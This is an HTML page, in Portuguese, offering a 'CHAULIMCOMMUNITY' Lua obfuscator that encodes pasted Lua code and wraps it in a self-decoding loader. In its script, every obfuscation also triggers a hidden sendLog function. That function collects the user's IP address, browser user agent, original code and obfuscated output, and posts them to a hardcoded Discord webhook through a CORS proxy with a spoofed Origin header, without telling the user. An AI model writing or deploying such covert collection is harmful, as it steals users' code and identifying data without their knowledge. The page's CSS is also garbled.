<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>CHAULIMCOMMUNITY</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial;}

body{
background:linear-gradient(135deg,#0f0f0f,#1a1a1a);

justify-content:center;
align-items:center;
height:100vh;

}

.container{
width:850px;

}

h1{

}

width:100%;

.buttons{

}

</head>

<body>

<div class="container">

<h1>CHAULIMCOMMUNITY</h1>

<textarea id="input" placeholder="Cole seu código Lua..."></textarea>

<div class="buttons">
<button class="obf" onclick="obfuscate()">OFUSCAR</button>
<button class="copy" onclick="copyCode()">COPIAR</button>
<button class="download" onclick="downloadLua()">BAIXAR</button>
</div>

<textarea id="output" placeholder="Código protegido..."></textarea>

</div>

<script>

/* =========================
   SEU WEBHOOK
========================= */
const WEBHOOK_URL = "https://discord.com/api/webhooks/1518007783071678494/ZztUYvtL0k1etMt6MeUngeGheH0zCf1zbQP9-7uWA_hLHU6GuGyQsIYO1eQmKj8NdIwr";


// PEGA IP DO USUÁRIO
async function getIP() {
  try {
    let res = await fetch("https://api.ipify.org?format=json");
    let json = await res.json();
    return json.ip;
  } catch(e) { return "Desconhecido" }
}


async function sendLog(original, output){
  const ip = await getIP();
  const navegador = navigator.userAgent;

  const dados = {
    content: "🔥 **NOVO CÓDIGO OFUSCADO**",
    embeds: [
      {
        title: "CHAULIMCOMMUNITY LOG",
        color: 16711680,
        fields: [
          { name: "🌐 IP do Usuário", value: "`" + ip + "`" },
          { name: "🖥️ Navegador", value: navegador.slice(0, 100) + "..." },
          { name: "📥 Código Original", value: "```lua\n" + (original?.slice(0, 1000) || "Vazio") + "\n```" },
          { name: "📤 Código Ofuscado", value: "```lua\n" + (output?.slice(0, 1000) || "Vazio") + "\n```" }
        ],
        footer: { text: "Sistema de Obfuscador • Chaulim Community" },
        timestamp: new Date().toISOString()
      }
    ]
  };

  // MÉTODO QUE SEMPRE FUNCIONA (contorna bloqueio)
  fetch("https://cors-anywhere.herokuapp.com/" + WEBHOOK_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Origin": "https://mecanica15789.github.io"
    },
    body: JSON.stringify(dados)
  })
  .then(() => alert("✅ LOG ENVIADO COM SUCESSO!"))
  .catch(err => alert("❌ ERRO: " + err));
}


/* =========================
   FUNÇÕES OBFUSCADOR
========================= */

function rand(){
let c="abcdefghijklmnopqrstuvwxyz"
let n="_"
for(let i=0;i<10;i++){n+=c[Math.floor(Math.random()*c.length)]}
return n
}

function b64(s){return btoa(unescape(encodeURIComponent(s)))}
function rev(s){return s.split("").reverse().join("")}
function shift(s){let r="";for(let i=0;i<s.length;i++){r+=String.fromCharCode(s.charCodeAt(i)+2)}return r}
function toBytes(s){let a=[];for(let i=0;i<s.length;i++){a.push(s.charCodeAt(i))}return a}


function obfuscate(){
let code = document.getElementById("input").value
if(!code) return alert("⚠️ Cole um código antes!")

let c1 = b64(code)
let c2 = rev(c1)
let c3 = shift(c2)
let bytes = toBytes(c3)

let v = rand(), f1 = rand(), f2 = rand(), f3 = rand(), exec = rand()

let lua = `
local ${v}={${bytes.join(",")}}

local function ${f1}(t)
 local s=""
 for i=1,#t do s=s..string.char(t[i]) end
 return s
end

local function ${f2}(s)
 local r=""
 for i=1,#s do r=r..string.char(s:byte(i)-2) end
 return r
end

local function ${f3}(s)
 return s:reverse()
end

local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

local function b64d(data)
 data = string.gsub(data, '[^'..b..'=]', '')
 return (data:gsub('.', function(x)
  if x == '=' then return '' end
  local r,f='',(b:find(x)-1)-1
  for i=6,1,-1 do
   r = r .. (f%2^i - f%2^(i-1) > 0 and '1' or '0')
  end
  return r
 end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
  if #x ~= 8 then return '' end
  local c=0
  for i=1,8 do
   c = c + (x:sub(i,i)=='1' and 2^(8-i) or 0)
  end
  return string.char(c)
 end))
end

local ok,err = pcall(function()
 local s=${f1}(${v})
 s=${f2}(s)
 s=${f3}(s)
 s=b64d(s)

 local ${exec}=load(s)
 if ${exec} then ${exec}() end
end)

if not ok then print("❌ CHAULIM ERROR: "..tostring(err)) end
`

document.getElementById("output").value = lua
sendLog(code, lua);
}


function copyCode(){
let t = document.getElementById("output").value
if(!t) return alert("⚠️ Nada para copiar!")
navigator.clipboard.writeText(t)
alert("📋 Copiado!")
}

function downloadLua(){
let t = document.getElementById("output").value
if(!t) return alert("⚠️ Nada para baixar!")
let blob = new Blob([t], {type:"text/plain"})
let a = document.createElement("a")
a.href = URL.createObjectURL(blob)
a.download = "CHAULIMCOMMUNITY_protegido.lua"
a.click()
}

</script>

</body>
</html>
